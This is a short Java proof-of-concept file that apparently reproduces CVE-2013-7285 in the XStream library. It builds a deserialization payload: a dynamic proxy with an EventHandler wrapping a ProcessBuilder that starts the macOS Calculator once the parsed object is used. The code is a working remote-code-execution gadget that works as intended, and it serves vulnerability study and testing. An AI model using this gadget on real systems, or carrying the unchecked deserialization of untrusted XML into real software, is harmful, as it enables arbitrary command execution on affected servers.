package CVE_2013_7285.variant1;

import CVE_2013_7285.variant1.pojo.Contact;
import com.thoughtworks.xstream.XStream;

/**
 *
 */
public class Issue {

    public static void main(String[] args) {

        XStream xstream = new XStream();

        String payload = "<dynamic-proxy>  \n"
            + "<interface>CVE_2013_7285.variant1.pojo.Contact</interface>  \n"
            + "<handler class=\"java.beans.EventHandler\">  \n"
            + "    <target class=\"java.lang.ProcessBuilder\">\n"
            + "    <command><string>/Applications/Calculator.app/Contents/MacOS/Calculator</string></command>\n"
            + "    </target>\n"
            + "    <action>start</action>\n"
            + "</handler>  \n"
            + "</dynamic-proxy> ";


        Contact contact = (Contact)xstream.fromXML(payload);
        contact.getFirstName();
    }
}
